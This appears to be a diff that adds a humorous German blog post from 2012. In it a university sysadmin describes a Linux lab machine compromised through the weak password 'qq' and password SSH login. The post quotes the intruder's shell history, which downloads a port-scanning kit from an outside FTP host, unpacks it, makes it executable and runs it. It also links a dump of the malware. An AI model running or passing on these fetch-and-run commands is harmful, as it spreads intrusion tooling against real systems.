@@ -1,0 +1,36 @@
+---
+title: qq und die IT-Sicherheit
+date: 18.05.2012, 20:37
+tags: Linux
+---
+
+Letzten Mittwoch bekam ich während einer Vorlesung 'ne Mail, dass das
+Rechenzentrum der Universität einen Hack0r-Angriff an einem unserer
+Rechensklaven festgestellt hat. Etwas schockiert, wie DAS nur mit LINUX
+passieren konnte, bin ich schnell vorbeigekommen und fand in der Tat eine Art
+"Bot".
+
+Als ordentlicher Sys-Admin nutzen ich und meine Kollegin nur SSH-Keys und so
+dachte ich mir auch nichts, als ich bei der versehentlichen Deskop-Variante
+von Ubuntu dem Standard-Nutzer das Passwort `qq` zu geben, immerhin würde ich
+ja den SSH-Zugang auf Schlüsseldateien beschränken. Naja, dazu kam es dann
+doch nicht, weil sich die Biologen im Praktikum schon so schwer genug mit
+einer UNIX-Shell tun und so konnte man sich weiterhin per Passwort einloggen.
+
+So hat sich dann nach mehreren Monaten -- 191 Tage um genau zu sein -- doch
+endlich jemand gefunden und den viel, viel schwereren Nutzernamen zu obigem
+Passwort zu finden! Nämlich "dev". Das ist *Security by Obscurity* vom
+feinsten! Der Bot war aber auch nicht der klügste. Seine Aktivitäten waren
+(primär Portscanning) komplett in der *.bash_history* nachzulesen:
+
+    :::sh
+    $ wget ftp://test:testtest@62.160.84.235/KapelaScan.tgz; tar zxvf K*
+    $ rm -rf KapelaScan.tgz; cd kapela
+    $ chmod +x *
+    $ ls
+    $ ./a 80.236
+    $ ps x
+
+Ein `rm -rf /home/dev` setzte dem Spuk dann ein Ende. Wer an einem
+[Dump](/files/2012/kapela.zip) interessiert ist. Inklusive Passwortliste, wo
+auch `qq` gelistet war. Es ist also *wirklich* ein unsicheres Passwort :-)
